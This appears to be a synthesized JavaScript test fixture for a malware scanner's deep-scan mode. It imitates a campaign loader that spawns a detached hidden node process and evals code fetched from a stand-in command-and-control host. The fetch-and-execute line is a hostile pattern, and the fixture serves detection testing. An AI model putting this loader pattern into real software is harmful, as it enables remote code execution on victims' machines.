// Synthesized fixture: not a real captured payload. Mirrors the campaign's
// loader shape below, but under a non-standard filename that only --deep
// scanning picks up.
const child = require("child_process").spawn("node", ["-e", "iter"], { detached: true, stdio: "ignore" });
child.unref();

eval(require("https").get("http://example-c2.test/payload.js"));
